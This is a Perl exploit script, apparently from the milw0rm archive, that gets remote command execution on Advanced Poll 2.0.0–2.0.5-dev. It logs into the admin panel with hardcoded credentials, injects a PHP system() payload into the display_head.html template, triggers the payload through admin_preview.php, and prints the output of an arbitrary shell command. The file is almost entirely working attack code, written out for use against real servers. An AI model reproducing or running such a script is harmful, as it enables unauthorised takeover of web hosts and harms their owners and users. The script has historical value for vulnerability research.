#!/usr/bin/perl -w
# Advanced Poll 2.0.0 >= 2.0.5-dev textfile RCE.
#
# date: 30/07/06
# 
# diwou <diwou@phucksys.org>
#
# PHCKSEC (c) 2001-2006.
#
# Hey, what a mad world!
#

use strict;
use warnings;
use LWP::UserAgent;
use MD5;

#
# args: http://url/apoll_path cmd
#
# proxy: export PROXY='http|https://www.my.big.and.famous.proxy:8080/'
# url: http|https://tatget:(port)/phppoll/
#

die("RTFC! ;)") unless(@ARGV>1);

my ($lwp,$agent,$out,$res,$url,$cmd)=(undef,undef,undef,undef,$ARGV[0],$ARGV[1]);

my %ipost=
(
	poll_tplset => 'default',
	'tpl[display_head.html]' =>
<<HEAD
\\".system(getenv(HTTP_PHP)).exit().\\"
<table width="\$pollvars[table_width]" border="0" cellspacing="0" cellpadding="1" bgcolor="\$pollvars[bgcolor_fr]">
  <tr align="center">
    <td><style type="text/css">
       <!--
        .input { font-family: \$pollvars[font_face]; font-size: 8pt}
        .links { font-family: \$pollvars[font_face]; font-size: 7.5pt; color: \$pollvars[font_color]}
       -->
      </style><font face="\$pollvars[font_face]" size="-1" color="#FFFFFF"><b>\$pollvars[title]</b></font></td>
  </tr>
  <tr align="center">
    <td>
      <table width="100%" border="0" cellspacing="0" cellpadding="2" align="center" bgcolor="\$pollvars[bgcolor_tab]">
        <tr>
          <td height="40" valign="middle"><font face="\$pollvars[font_face]" color="\$pollvars[font_color]" size="1"><b>\$question</b></font></td>
        </tr>
        <tr align="right" valign="top">
          <td>
            <form method="post" action="\$this->form_forward">
            <table width="100%" border="0" cellspacing="0" cellpadding="0" align="center">
              <tr valign="top" align="center">
                <td>
                  <table width="100%" border="0" cellspacing="0" cellpadding="1" align="center">
HEAD
,
	action   =>  '',
	tplset   =>  'default',
	tpl_type =>  'display',
	session  =>  '',
	uid      =>  1
);

my %epost=
(
	session    => '',
	uid        => 1,
	poll_tplst => 'default',
	tpl_type   => 'display',
);

my %zday=
(
	username => 'jakahw4nk4h',
	'pollvars[poll_username]' => 'jakahw4nk4h',
	password => 'fuckoff',
	'pollvars[poll_password]' => ''
);

$zday{'pollvars[poll_password]'}=&md5($zday{password});
$agent="Hey IDS! i'm gonna fuck your advanced poll right? B===D"; # post method doesnt log it, so doesnt matter.
#$agent="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1";

$lwp=new LWP::UserAgent();
$lwp->agent($agent);
$lwp->timeout(10);
$lwp->protocols_allowed(['http','https']);

if($ENV{PROXY})
{
	$lwp->proxy(['http','https'],$ENV{PROXY});
	print "Using proxy ".$ENV{PROXY}."\n";
}

$url.="/" if($url!~/\/$/);
$url.="admin/index.php";
print "Doing some pretty with ".$url."...\n\n";

print "+ generating session...\n";
$out=$lwp->post($url,\%zday)->content();
if($out=~ /index\.php\?session=((.){32})/)
{
	$ipost{'session'}=$epost{'session'}=$1;
	print "  session: ".$ipost{'session'}."\n";
	
	$url=~s/index\.php/admin_templates\.php/g;
	print "+ injecting diplay_head.html template...\n";
	$out=$lwp->post($url,\%ipost)->content();
	$epost{'action'}=$1 if($out=~ /<input type="submit" name="action" value="(.*)" class="button">/);
	print "  button: ".$epost{'action'}."\n";

	$url=~s/admin_templates\.php/admin_preview\.php/g;
	print "+ executing...\n";
	$out=$lwp->post($url,\%epost,PHP => "echo BOCE;".$cmd.";echo EOCE")->content();

	print "-- BOCE --\n";
	foreach $out (split(/\n/,$out))
	{
		$res=1,next if($out=~/BOCE/);
		$res=0,next if($out=~/EOCE/);
		print $out."\n" if($res);
	}
	print "-- EOCE --\n";
}
else
{
	print "don't worry, u can improve me! eh eh eh :D?\n";
}

sub md5
{
	$_=new MD5;
	$_->add(@_);
	return unpack("H*",$_->digest());
}

# milw0rm.com [2007-02-13]
